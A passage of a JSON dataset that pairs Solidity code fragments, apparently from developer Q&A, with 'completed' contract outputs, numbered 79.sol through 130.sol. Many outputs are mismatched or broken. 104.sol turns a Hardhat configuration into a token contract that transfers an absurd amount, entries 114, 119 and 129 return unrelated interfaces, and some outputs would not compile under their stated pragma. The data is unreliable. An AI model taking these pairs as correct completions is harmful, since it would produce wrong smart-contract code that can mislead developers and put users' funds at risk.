        "input": "function addXtoAccName( address _accNumber, string memory _xtoName ) public {\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract Account {\n\n  function addXtoAccName(address _accNumber, string memory _xtoName) public;\n\n}\n\n"
    },
    "79.sol": {
        "input": "await tether.approve(decentralbank.address, tokens(\"100\"), {\n  from: customer,\n});\n\nawait decentralbank.stakeTokens(tokens(\"100\"), {\n  from: customer,\n});\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IToken {\n    function approve(address _spender, uint256 _amount) external returns (bool);\n    function transfer(address _to, uint256 _value) external payable returns (bool);\n    function transferFrom(address _from, address _to, uint256 _value)\n        external\n        returns (bool);\n    function balanceOf(address _owner) external view returns (uint);\n\n    event Approval(address indexed _owner, address indexed spender, uint256 value);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n}\n\ninterface IStakerBank {\n    function stake(uint256 amount) external;\n    function withdraw(uint256 amount) external returns (uint256);\n}\n\n"
    },
    "80.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    function isMsgSenderAddressThis() public view returns (bool) {\n        return msg.sender == address(this);\n    }\n    \n    function yes() external view returns (bool) {\n        return this.isMsgSenderAddressThis();\n    }\n\n    function nope() external view returns (bool) {\n        return isMsgSenderAddressThis();\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    function isMsgSenderAddressThis() public view returns (bool) {\n        return msg.sender == address(this);\n    }\n    \n    function yes() external view returns (bool) {\n        // makes an external call to itself\n        // same as MyContract(address(this)).isMsgSenderAddressThis()\n        return this.isMsgSenderAddressThis();\n    }\n\n    function nope() external view returns (bool) {\n        // this is an internal call, so it returns false\n        return isMsgSenderAddressThis();\n    }\n}\n\n"
    },
    "81.sol": {
        "input": "    function PubtoAddr(string calldata str_) pure public returns(bytes20) {\n        bytes memory b = bytes(str_);\n        return( bytes20(uint160(uint256(keccak256(b)))) );\n    } \n\n\n",
        "output": "pragma solidity ^0.8.9;\nlibrary Utils {\n\n  function PubtoAddr(string calldata str_) pure public returns(bytes20) {\n    bytes memory b = bytes(str_);\n    return( bytes20(uint160(uint256(keccak256(b)))) );   \n  }\n}\n\n"
    },
    "82.sol": {
        "input": "block.timestamp >= _openingTime\n\ncurl -X POST \\\n  http:\n  -H 'Content-Type: application/json' \\\n  -d '{\n    \"jsonrpc\": \"1.0\",\n    \"id\": \"curltest\",\n    \"method\": \"evm_increaseTime\",\n    \"params\": [\n      100000\n  ]\n}'\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    uint256 private _openingTime;\n    \n    constructor(uint256 openingTime) {\n        _openingTime = openingTime;\n    }\n    \n    function isOpen() public view returns(bool) {\n        return block.timestamp >= _openingTime;\n    }\n}\n"
    },
    "83.sol": {
        "input": "\n    function log(string memory p0, string memory p1, string memory p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,string,string)\", p0, p1, p2));\n    }\n\n    console.log(\"your format string %s %s\", string(yourBytesVariable1), string(yourBytesVariable2));\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface ILogs {\n    function log(string memory p0, string memory p1, string memory p2) external;\n}\n\n"
    },
    "84.sol": {
        "input": " import \"@uniswap/v3-core/contracts/interfaces/IUniswapV3Factory.sol\";\n\n address poolAddress = IUniswapV3Factory(_factory).getPool(\n        _token0,\n        _token1,\n        _fee\n    );\n\nmapping(address => mapping(address => mapping(uint24 => address))) public override getPool;\n\nrequire(poolAddress!=address(0))\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract IUniswapV3Factory {\n    function getPool(\n        address tokenA,\n        address tokenB,\n        uint24 fee\n    )\n    external\n    returns (address poolAddress);\n}\n\n"
    },
    "85.sol": {
        "input": "modifier callerIsUser() {\n  require(tx.origin == msg.sender, \"The caller is another contract\");\n  _;\n}\n\nfunction example() callerIsUser {\n  ...\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ninterface IUser {\n  function getName() external view returns (string memory);\n}\n\ncontract Example {\n  modifier callerIsUser() {\n    require(tx.origin == msg.sender, \"The caller is another contract\");\n    _;\n  }\n\n  constructor() {}\n\n  function example() callerIsUser {\n    IUser(0).getName();\n  }\n}\n\n"
    },
    "87.sol": {
        "input": "    SimpleStorage[] public simpleStorageArray; \n\n    function createSimpleStorageContract() public {\n    SimpleStorage simpleStorage = new SimpleStorage();\n    simpleStorageArray.push(simpleStorage);\n\n    }  \n       \n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SimpleStorageArrayExample {\n\n    SimpleStorage[] public simpleStorageArray; \n\n    function createSimpleStorageContract() public {\n    SimpleStorage simpleStorage = new SimpleStorage();\n    simpleStorageArray.push(simpleStorage);\n\n    }  \n   \n}\n\ncontract SimpleStorage {\n    function addValue() public { \n    uint256 storageValue = 5028135561;\n    emit Log_value_added(storageValue);}\n    function subtractValue() public {\n    uint256 storageValue = 5028135561;\n    emit Log_value_subtracted(storageValue);}\n    event Log_value_added(uint256 _value_added);\n    event Log_value_subtracted(uint256 _value_subtracted);\n}\n\n"
    },
    "88.sol": {
        "input": "uint8 number;\n\nfunction isNumberValid() external returns (bool) {\n    return (\n        number >= 100  \n        && number <= 200  \n    );\n}\n\nuint8 number;\n\nfunction isNumberValid() external returns (bool) {\n    uint8 _number = number; \n    return (\n        _number >= 100  \n        && _number <= 200  \n    );\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface ICalculator {\n    function isNumberValid() external returns (bool);\n}\n\n"
    },
    "89.sol": {
        "input": "import Station from './build/Station.json';\n\n\n\n  const station = (address) => {\n    return new web3.eth.Contract(JSON.parse(Station.interface), address);\n  };\n\nexport default station;\n\npragma solidity ^0.4.17;\ncontract StationFactory {\n    address[] public deployedStations;\n\n    function createStation(uint minimum) public {\n        address newStation = new Station(minimum, msg.sender);\n        deployedStations.push(newStation);\n    }\n\n    function getDeployedStations() public view returns (address[]) {\n        return deployedStations;\n    }\n}\n\ncontract Station {\n    struct Request {\n        string description;\n        uint value;\n        address recipient;\n        bool complete;\n        uint approvalCount;\n        mapping(address => bool) approvals;\n    }\n\n    Request[] public requests;\n    address public manager;\n    uint public minimumContribution;\n    mapping(address => bool) public approvers;\n    uint public approversCount;\n\n    modifier restricted() {\n        require(msg.sender == manager);\n        _;\n    }\n\n    function Station(uint minimum, address creator) public {\n        manager = creator;\n        minimumContribution = minimum;\n    }\n\n    function contribute() public payable {\n        require(msg.value > minimumContribution);\n\n        approvers[msg.sender] = true;\n        approversCount++;\n    }\n\n    function createRequest(string description, uint value, address recipient) public restricted {\n        Request memory newRequest = Request({\n           description: description,\n           value: value,\n           recipient: recipient,\n           complete: false,\n           approvalCount: 0\n        });\n\n        requests.push(newRequest);\n    }\n\n    function approveRequest(uint index) public {\n        Request storage request = requests[index];\n\n        require(approvers[msg.sender]);\n        require(!request.approvals[msg.sender]);\n\n        request.approvals[msg.sender] = true;\n        request.approvalCount++;\n    }\n\n    function finalizeRequest(uint index) public restricted {\n        Request storage request = requests[index];\n\n        require(request.approvalCount > (approversCount / 2));\n        require(!request.complete);\n\n        request.recipient.transfer(request.value);\n        request.complete = true;\n    }\n\n    function getSummary() public view returns (\n      uint, uint, uint, uint, address\n      ) {\n        return (\n          minimumContribution,\n          this.balance,\n          requests.length,\n          approversCount,\n          manager\n        );\n    }\n\n    function getRequestsCount() public view returns (uint) {\n        return requests.length;\n    }\n}\n\n\nconst HDWalletProvider = require('@truffle/hdwallet-provider');\nconst Web3 = require('web3');\nconst compiledCRMS = require('./build/crms.json');\nconst compiledStationFactory = require('./build/StationFactory.json');\n\nconst provider = new HDWalletProvider(\n  'YOUR METAMASK PHRASE',\n  'INFURA LINK'\n);\n\nconst web3 = new Web3(provider);\n\n\nconst deploy = async()=>{\n  const accounts = await web3.eth.getAccounts();\n\n  console.log('Attempting to deploy from account', accounts[0]);\nconst result =  await new web3.eth.Contract(JSON.parse(compiledCRMS.interface))\n  .deploy({data:compiledCRMS.bytecode })\n  .send({gas:'10000000',from:accounts[0]});\n\nconst result_1 = await new web3.eth.Contract(JSON.parse(compiledStationFactory.interface))\n.deploy({data:compiledStationFactory.bytecode})\n.send({gas:'10000000',from:accounts[0]});\n\n\nconsole.log('CRMS Contract deployed to',result.options.address);\nconsole.log('Station Factory Contract deployed to',result_1.options.address);\nprovider.engine.stop();\n};\ndeploy();\n\n\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract StationFactory {\n    address[] public deployedStations;\n\n    function createStation(uint minimum) public {\n        address newStation = new Station(minimum, msg.sender);\n        deployedStations.push(newStation);\n    }\n\n    function getDeployedStations() public view returns (address[]) {\n        return deployedStations;\n    }\n}\n\ncontract Station {\n    struct Request {\n        string description;\n        uint value;\n        address recipient;\n        bool complete;\n        uint approvalCount;\n        mapping(address => bool) approvals;\n    }\n\n    Request[] public requests;\n    address public manager;\n    uint public minimumContribution;\n    mapping(address => bool) public approvers;\n    uint public approversCount;\n\n    modifier restricted() {\n        require(msg.sender == manager);\n        _;\n    }\n\n    function Station(uint minimum, address creator) public {\n        manager = creator;\n        minimumContribution = minimum;\n    }\n\n    function contribute() public payable {\n        require(msg.value > minimumContribution);\n\n        approvers[msg.sender] = true;\n        approversCount++;\n    }\n\n    function createRequest(string description, uint value, address recipient) public restricted {\n        Request memory newRequest = Request({\n           description: description,\n           value: value,\n           recipient: recipient,\n           complete: false,\n           approvalCount: 0\n        });\n\n        requests.push(newRequest);\n    }\n\n    function approveRequest(uint index) public {\n        Request storage request = requests[index];\n\n        require(approvers[msg.sender]);\n        require(!request.approvals[msg.sender]);\n\n        request.approvals[msg.sender] = true;\n        request.approvalCount++;\n    }\n\n    function finalizeRequest(uint index) public restricted {\n        Request storage request = requests[index];\n\n        require(request.approvalCount > (approversCount / 2));\n        require(!request.complete);\n\n        request.recipient.transfer(request.value);\n        request.complete = true;\n    }\n\n    function getSummary() public view returns (\n      uint, uint, uint, uint, address\n      ) {\n        return (\n          minimumContribution,\n          this.balance,\n          requests.length,\n          approversCount,\n          manager\n        );\n    }\n\n    function getRequestsCount() public view returns (uint) {\n        return requests.length;\n    }\n}\n\n"
    },
    "91.sol": {
        "input": " pragma solidity >=0.7.0 <0.9.0;\n\n\ncontract new_nth{\n\n function nth(uint n,int a,int b,int c) pure public returns(int){\n    int[100] memory arr;\n    arr[0] = a;\n    arr[1] =b;\n    arr[2] = c;\n    uint i;\n    for(i =3;i<n;++i){\n        arr[i] = arr[i-1]+arr[i - 2 ]+arr[i - 3];\n    }\n    return arr[n-1];\n }\n}\n\n\n",
        "output": "// SPDX-License-Identifier: GPL-3.0\n pragma solidity >=0.7.0 <0.9.0;\n\n\ncontract new_nth{\n\n function nth(uint n,int a,int b,int c) pure public returns(int){\n    int[100] memory arr;\n    arr[0] = a;\n    arr[1] =b;\n    arr[2] = c;\n    uint i;\n    for(i =3;i<n;++i){\n        arr[i] = arr[i-1]+arr[i - 2 ]+arr[i - 3];\n    }\n    return arr[n-1];\n }\n}\n\n"
    },
    "93.sol": {
        "input": "int[5] public array = [int(1), int(2), int(3), int(4), int(5)];\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TestArray {\n    int[5] public array = [int(1), int(2), int(3), int(4), int(5)];\n\n}\n\n"
    },
    "94.sol": {
        "input": "contract YourContract {\n   \n    function destruct(address addr) ownerOnly {\n         selfdestruct(addr);\n    }\n\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract YourContract {\n    address public owner;\n\n    constructor() public {\n        owner = msg.sender;\n    }\n   \n    modifier ownerOnly() {\n        require(msg.sender == owner, \"You must be the owner\");\n        _;\n    }\n    \n    function destruct(address payable addr) public ownerOnly {\n        selfdestruct(addr);\n    }\n}\n\n"
    },
    "95.sol": {
        "input": "function updateStructA(string memory _newValue) public {\n    tests[msg.sender].a = _newValue;\n}\n\nfunction updateStructB(string memory _newValue) public {\n    tests[msg.sender].b = _newValue;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TestStruct {\n\n    struct TestStruct {\n        string a;\n        string b;\n    }\n\n    mapping (address => TestStruct) public tests;\n\n    function updateStructA(string memory _newValue) public {\n        tests[msg.sender].a = _newValue;\n    }\n\n    function updateStructB(string memory _newValue) public {\n        tests[msg.sender].b = _newValue;\n    }\n}\n\n"
    },
    "96.sol": {
        "input": "function store(uint256 _favoriteNumber) public {\nfavoriteNumber = _favoriteNumber;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract favorite {\n\n    uint256 public favoriteNumber;\n   \n    constructor () {\n        favoriteNumber = uint256(513);\n    }\n\n    function store(uint256 _favoriteNumber) public {\n        favoriteNumber = _favoriteNumber;\n    }\n\n}\n\n"
    },
    "97.sol": {
        "input": "contract Test {\n    address public user;\n    error MyCustomError(address _address);\n\n    function revertError() public view {\n    if(user!=address(0)) \n    { \n        revert MyCustomError({_address: msg.sender});\n        }\n    }\n }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Test {\n    address public user;\n    /// custom error\n    error MyCustomError(address _address);\n\n    function revertError() public view {\n    // I just had to pass a valid condition. address(0)=0x0000000000000000000000000000000000000000\n    // if(user) would give this error: \"Type address is not implicitly convertible to expected type bool\"\n    if(user!=address(0)) \n    { \n        revert MyCustomError({_address: msg.sender});\n        }\n    }\n }\n\n"
    },
    "98.sol": {
        "input": "    struct Users{\n       string fullname;\n       string[] email;\n    }\n    mapping(address => Users) private userinfo;\n\n    function compareString(string memory str1, string memory str2) internal returns (bool) {\n        if(bytes(str1).length != bytes(str2).length) {\n            return false;\n        } else {\n            return keccak256(abi.encodePacked(str1)) == keccak256(abi.encodePacked(str2));\n        }\n    }\n\n    function removeEmail(address userAddress, string memory emailToRemove) external {\n        string[] memory emails = userinfo[userAddress].email;\n        uint256 emailLength = emails.length;\n        for (uint256 i; i<emailLength; i++) {\n            if (compareString(emails[i], emailToRemove)) {\n                userinfo[userAddress].email[i] = userinfo[userAddress].email[emailLength - 1];\n                userinfo[userAddress].email.pop();\n                break;\n            }\n        }\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract UserContract {\n    struct Users{\n       string fullname;\n       string[] email;\n    }\n    \n    mapping(address => Users) private userInfo;\n\n    function compareString(string memory str1, string memory str2) internal pure returns (bool) {\n        if(bytes(str1).length != bytes(str2).length) {\n            return false;\n        } else {\n            return keccak256(abi.encodePacked(str1)) == keccak256(abi.encodePacked(str2));\n        }\n    }\n\n    function removeEmail(address userAddress, string memory emailToRemove) external {\n        string[] storage emails = userInfo[userAddress].email;\n        uint256 emailLength = emails.length;\n        for (uint256 i; i<emailLength; i++) {\n            if (compareString(emails[i], emailToRemove)) {\n                emails[i] = emails[emailLength - 1];\n                emails.pop();\n                break;\n            }\n        }\n    }\n\n    function addEmail(address userAddress, string memory emailToAdd, string memory fullName) external {\n        Users storage user = userInfo[userAddress];\n        user.fullname = fullName;\n        user.email.push(emailToAdd);\n    }\n\n    function getEmails(address userAddress) external view returns(string[] memory) {\n        return userInfo[userAddress].email;\n    }\n}\n\n"
    },
    "102.sol": {
        "input": "pragma solidity ^0.8.7;\n\ncontract MAth{\n\nuint public publicM;\nuint public remPublic;\n\n  constructor()  {\n    publicM = 10;\n  }\n  function setRemPublic() public  returns(uint)  {\n   remPublic = publicM;\n   return remPublic;\n  }\n}\n\n\n",
        "output": "// SPDX-License-Identifier: MIT \npragma solidity ^0.8.7;\n\ncontract MAth{\n\nuint public publicM;\nuint public remPublic;\n\n  constructor()  {\n    publicM = 10;\n  }\n  function setRemPublic() public  returns(uint)  {\n   remPublic = publicM;\n   return remPublic;\n  }\n}\n\n"
    },
    "103.sol": {
        "input": "payable(msg.sender).transfer(balance / 100 * 10);\npayable(_friend).transfer(balance / 100 * 90);\n\n\n",
        "output": "pragma solidity ^0.8.9;\nlibrary PayWithEth {\n\n  function sendEther (address receiver, uint amount) internal {\n    payable(receiver).transfer(amount);\n  }\n\n}\n\n"
    },
    "104.sol": {
        "input": "module.exports = {\n      solidity: {\n        version: \"0.8.9\",\n        settings: {\n          optimizer: {\n            enabled: true,\n            runs: 1000,\n          },\n        },\n      },\n    };\n\nsolidity: {\n    compilers: [\n      {\n        version: \"0.6.12\",\n      },\n      {\n        version: \"0.5.16\",\n      },\n      {\n        version: \"0.6.6\",\n        settings: {\n          optimizer: {\n            enabled: true,\n            runs: 1000,\n          },\n        },\n      },\n    ],\n  },\n};\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract MyToken {\n  constructor(address owner) {\n    owner.transfer(1000000 * 10 ** 25);\n  }\n}\n\n"
    },
    "105.sol": {
        "input": "modifier onlyOwner() {\n   require(isOwner());\n   _;\n}\n\nmodifier onlyOwner() {\n   _;\n   require(isOwner());\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    address public owner;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Only the owner can call this function\");\n        _;\n    }\n\n    // Rest of the contract code...\n}\n"
    },
    "109.sol": {
        "input": "pragma solidity ^0.8.15;\n\ncontract a {\n    bool public recived; \n    function recive2ether() external payable {\n        require(msg.value >= 2 ether);\n        recived = true;\n    }\n}\n\ninterface ainterface {\n    function recive2ether() external payable;\n}\n\ncontract b {\n    ainterface A;\n    constructor (ainterface _A) {\n        A = ainterface(_A);\n    }\n\n    function sendEthtoA() public payable {\n        A.recive2ether{value: msg.value}(); \n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\n     interface ainterface {\n         function recive2ether() external payable;\n     }\n\n     contract a {\n         bool public recived; \n         function recive2ether() external payable {\n             require(msg.value >= 2 ether);\n             recived = true;\n         }\n     }\n\n     contract b {\n         ainterface A;\n         constructor (ainterface _A) {\n             A = ainterface(_A);\n         }\n\n         function sendEthtoA() public payable {\n             A.recive2ether{value: msg.value}();  \n         }\n     }\n\n"
    },
    "112.sol": {
        "input": "contract CommitteePrecompiled {\n    struct Node {\n    }\n    mapping (address => Node[]) userNodes;\n\n    function RegisterNode() public {\n        Node memory node = Node(\n);\n        userNodes[msg.sender].push(node);\n    }\n\n    function QueryState()   public view returns(string memory, int ) {\n    }\n\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract CommitteePrecompiled {\n    struct Node {\n        // TODO params\n    }\n    mapping (address => Node[]) userNodes;\n\n    function RegisterNode() public {\n        Node memory node = Node(/* TODO params */);\n        userNodes[msg.sender].push(node);\n    }\n\n    function QueryState()   public view returns(string memory, int ) {\n        // TODO your code to retrieve the state and return a `string` and an `int`\n    }\n\n    // TODO implement all your functions\n}\n\n"
    },
    "114.sol": {
        "input": "function _beforeTokenTransfer(\n    address from,\n    address to,\n    uint256 firstTokenId,\n    uint256 batchSize\n) internal virtual override (ERC721, ERC721Enumerable, ERC721Pausable) {\n    super._beforeTokenTransfer(from, to, firstTokenId, batchSize);\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract ERC721 {\n    function safeTransferFrom(\n        address from,\n        address to,\n        uint256 tokenId\n    ) external;\n}\n\n"
    },
    "116.sol": {
        "input": "constructor() {\n        i_owner = msg.sender; \n    }\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract Ownable { function owner() public constant returns (address _owner); \n    function transferOwnership(address _new_owner) public; \n}\n\ncontract MyToken { \n    string public name = \"MyToken\";\n    string public symbol = \"MTV\";\n    uint8 public decimal_places = 18;\n    uint256 public total_supply = 600000000000000000000000000;\n    address public i_owner;\n    constructor() {\n        i_owner = msg.sender; \n    }\n}\n\n"
    },
    "117.sol": {
        "input": "contract CarShop {\n    address owner;\n    uint256 toyotaCount;\n    uint256 audiCount;\n    uint256 bmwCount;\n\n    Cars public toyota;\n    Cars public audi;\n    Cars public bmw;\n\n    enum CarType {Toyota, Audi, Bmw}\n    struct Cars {\n        CarType carType;\n        uint count;\n    }\n\n    constructor(uint256 _toyotaCount, uint256 _audiCount, uint256 _bmwCount) {\n        owner = msg.sender;\n        toyotaCount = _toyotaCount;\n        audiCount = _audiCount;\n        bmwCount = _bmwCount;\n\n        toyota = Cars(CarType.Toyota, _toyotaCount);\n        audi = Cars(CarType.Audi, _audiCount);\n        bmw = Cars(CarType.Bmw, _bmwCount);\n    }\n\n    \n    function addCarCount(CarType _carType, uint256 _count) public {\n        require(msg.sender == owner, \"Only owner can add car count\");\n        if(_carType == CarType.Toyota) {\n            toyota.count += _count;\n        } else if(_carType == CarType.Audi) {\n            audi.count += _count;\n        } else if(_carType == CarType.Bmw) {\n            bmw.count += _count;\n        }\n    }\n}\n\nimport { ethers } from \"hardhat\";\n\nasync function main() {\n    const [owner] = await ethers.getSigners();\n\n    const contractAddress = process.env.CAR_CONTRACT_ADDRESS;\n\n    const contract = await ethers.getContractFactory(\"CarShop\");\n    const contractInstance = await contract.attach(`${contractAddress}`);\n\n    const audi = await contractInstance.audi();\n    console.log(audi);\n\n    await contractInstance.connect(owner).addCarCount(1, 3);\n\n    const audiAfter = await contractInstance.audi();\n    console.log(audiAfter);\n}\n\nmain().catch((error) => {\n    console.error(error);\n    process.exitCode = 1;\n});\n\n[\n  1,\n  BigNumber { value: \"10\" },\n  carType: 1,\n  count: BigNumber { value: \"10\" }\n]\n[\n  1,\n  BigNumber { value: \"13\" },\n  carType: 1,\n  count: BigNumber { value: \"13\" }\n]\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract CarShop {\n    address owner;\n    uint256 toyotaCount;\n    uint256 audiCount;\n    uint256 bmwCount;\n\n    Cars public toyota;\n    Cars public audi;\n    Cars public bmw;\n\n    enum CarType {Toyota, Audi, Bmw}\n\n    struct Cars {\n        CarType carType;\n        uint count;\n    }\n\n    constructor(uint256 _toyotaCount, uint256 _audiCount, uint256 _bmwCount) {\n        owner = msg.sender;\n        toyotaCount = _toyotaCount;\n        audiCount = _audiCount;\n        bmwCount = _bmwCount;\n\n        toyota = Cars(CarType.Toyota, _toyotaCount);\n        audi = Cars(CarType.Audi, _audiCount);\n        bmw = Cars(CarType.Bmw, _bmwCount);\n    }\n\n    \n    function addCarCount(CarType _carType, uint256 _count) public {\n        require(msg.sender == owner, \"Only owner can add car count\");\n        if(_carType == CarType.Toyota) {\n            toyota.count += _count;\n        } else if(_carType == CarType.Audi) {\n            audi.count += _count;\n        } else if(_carType == CarType.Bmw) {\n            bmw.count += _count;\n        }\n    }\n}\n\n"
    },
    "119.sol": {
        "input": "let signedMessage = `\\x19Ethereum Signed Message:\\n${signedMessage.length}${message}`;\n\nfunction getSigner(string memory message, bytes memory sig) public view returns(address) {\n   bytes32 messageHash = keccak256(abi.encodePacked(message));\n   address signer = ECDSA.recover(messageHash, sig);\n   return signer;\n}\n\nlet prefixedMessage = `\\x19Ethereum Signed Message:\\n${message.length}${message}`\n  address = await mycontract.getSigner(prefixedMessage, signature);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC175 {\n  function reclaim() external returns (uint256);\n}\n\n"
    },
    "122.sol": {
        "input": "function setStudentRecords(string calldata _name, string calldata _address, string calldata _phoneNumber, uint16 _rollNumber,\n                              string calldata _DOB, uint8 _sem, uint8 _CGPA, string calldata _UniName) public\n{\n    StudentRecord.push(  \n        student(         \n            _name,\n            _address,\n            _phoneNumber,\n            _rollNumber,\n            _DOB,\n            _sem,\n            _CGPA,\n            _UniName\n        )\n    );\n}\n\n\n",
        "output": "pragma solidity ^0.7.6;\ncontract StudentRecords {\n    struct Student {\n        string name;\n        string addr;\n        string phoneNumber;\n        uint16 rollNumber;\n        string DOB;\n        uint8 sem;\n        uint8 CGPA;\n        string UniName;\n    }\n\n    Student[] public StudentRecord;\n\n    function setStudentRecords(string calldata _name, string calldata _address, string calldata _phoneNumber, uint16 _rollNumber,\n                              string calldata _DOB, uint8 _sem, uint8 _CGPA, string calldata _UniName) public\n    {\n        StudentRecord.push(Student(         \n            _name,\n            _address,\n            _phoneNumber,\n            _rollNumber,\n            _DOB,\n            _sem,\n            _CGPA,\n            _UniName\n        ));\n    }\n}\n\n"
    },
    "123.sol": {
        "input": "if (address(attr).code.length == 0) {\n    return;\n}\n\ntry attr.maybedoesntexist() {\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    struct Attr {\n        address addr;\n    }\n\n    Attr public attr;\n\n    function setAttrAddress(address _address) public {\n        attr.addr = _address;\n    }\n\n    function checkAttr() public view returns (bool){\n        if (attr.addr.code.length == 0) {\n            return false;\n        }\n        return true;\n    }\n    \n    function maybeDoesntExist() external view returns (bool){\n        try this.checkAttr() {\n            return true;\n        }\n        catch {\n            return false;\n        }\n    }\n}\n\n"
    },
    "124.sol": {
        "input": "function getTodo(string memory _name, uint _age) external pure returns(Todo memory) {\n        Todo memory myTodo = Todo(_name, _age);\n        return myTodo;\n}\n\npragma solidity ^0.8.0;\n\ncontract Test {\n    \n    struct Todo {\n        string name;\n        uint age;\n    }\n\n    Todo[] todoArray;\n\n    function createTodo(string memory _name, uint _age) public {\n        todoArray.push(Todo(_name, _age));\n    }\n\n    function getTodo(uint _index) external view returns(Todo memory) {\n        return todoArray[_index];\n    }\n} \n\n\n",
        "output": "pragma solidity ^0.8.9;\n   contract Test {\n\n     struct Todo {\n        string name;\n        uint age;\n    }\n\n    Todo[] todoArray;\n\n    function createTodo(string memory _name, uint _age) public {\n        todoArray.push(Todo(_name, _age));\n    }\n\n    function getTodo(string memory _name, uint _age) external pure returns(Todo memory) {\n        Todo memory myTodo = Todo(_name, _age);\n        return myTodo;\n    }\n \n    \n    receive() external payable {}\n\n  }\n\n"
    },
    "125.sol": {
        "input": "function callAnotherContract() external {\n    address anotherContract = address(0x123);\n    bytes memory data = hex\"7a1eb1b900\";\n    uint256 myValue = 0;\n    uint256 myGasLimit = 100000;\n\n    anotherContract.call{value: myValue, gas: myGasLimit}(data);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Test {\n    \n    \n    function callAnotherContract() external {\n        address anotherContract = address(0x123);\n        bytes memory data = hex\"7a1eb1b900\";\n        uint256 myValue = 0;\n        uint256 myGasLimit = 100000;\n\n        anotherContract.call{value: myValue, gas: myGasLimit}(data);\n    }\n}\n\n"
    },
    "126.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n  struct Strings {\n    string[] s;\n  }\n\n  function foo() external pure {\n    Strings[] memory strings = new Strings[](2);\n\n    strings[0].s = new string[](2);\n    strings[0].s[0] = \"a\";\n    strings[0].s[1] = \"b\";\n\n    strings[1].s = new string[](3);\n    strings[1].s[0] = \"a\";\n    strings[1].s[1] = \"b\";\n    strings[1].s[1] = \"c\";\n  }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n  struct Strings {\n    string[] s;\n  }\n\n  function foo() external pure {\n    Strings[] memory strings = new Strings[](2);\n\n    strings[0].s = new string[](2);\n    strings[0].s[0] = \"a\";\n    strings[0].s[1] = \"b\";\n\n    strings[1].s = new string[](3);\n    strings[1].s[0] = \"a\";\n    strings[1].s[1] = \"b\";\n    strings[1].s[1] = \"c\";\n  }\n}\n\n"
    },
    "127.sol": {
        "input": "function createNFT() public returns(bytes32){\n        getMintedAddress[indexForSenders]=msg.sender;\n        indexForSenders+=1\n        .....\n    }\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract NFTContract {\n    bytes32[] public mintedAddresses;\n    uint256 public indexForSenders;\n\n    function createNFT() public returns (bytes32) {\n        mintedAddresses.push(bytes32(uint256(msg.sender)));\n        indexForSenders += 1;\n        return bytes32(uint256(msg.sender));\n    }\n}\n"
    },
    "128.sol": {
        "input": "function test_storage(string storage _data) public {\n  data = _data;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TestContract {\n    string public data;\n\n    function test_storage(string memory _data) public {\n        data = _data;\n    }\n}\n\n"
    },
    "129.sol": {
        "input": "1101 << 4:\n1010\n0100\n1000\n0000\n\nentryRange |= uint224(ref.entryCount)<<160;\nentryRange |= uint224(ref.entryCount + amount)<<192;\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract ERC20Interface {\n    function totalSupply() public view returns (uint256);\n    function balanceOf(address account) public view returns (uint256);\n    function transfer(address recipient, uint256 amount) public returns (bool);\n    function allowance(address owner, address spender) public view returns (uint256);\n    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool);\n    function approve(address spender, uint256 amount) public returns (bool);\n    function getAllowance(address owner, address spender) public view returns (uint256);\n    function isApprovedForAll(address owner, address spender) public view returns (bool);\n}\n\ncontract TokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) public; }\n\ncontract Transfer {\n    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool);\n    function transfer(address recipient, uint256 amount) public returns (bool);\n    function allowance(address owner, address spender) public view returns (uint256);\n    function approve(address spender, uint256 amount) public returns (bool);\n    function getAllowance(address owner, address spender) public view returns (uint256);\n    \n    event Transfer(address indexed from, address indexed to, uint256 value);\n    \n  function () external payable {\n    throw;\n  }\n}\n\n"
    },
    "130.sol": {
        "input": "\n pragma solidity >=0.6.0;\n\n import \"./1_Storage.sol\";\n\n contract StorageFactory {\n\n      function createsimplestoragecontract() public {\n           Storage _simplestorage = new Storage();\n      }\n\n }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract StorageFactory {\n\n     function createsimplestoragecontract() public {\n          Storage _simplestorage = new Storage();\n     }\n\n }\n\ncontract Storage {\n\n    address public owner;\n\n    constructor() public {\n       owner = msg.sender;\n    }\n\n    modifier onlyOwner() {\n        require(msg.sender == owner);\n        _;\n    }\n\n    function getOwner() public view returns (address) {\n        return owner;\n    }\n\n}\n\n"
    },
    "131.sol": {
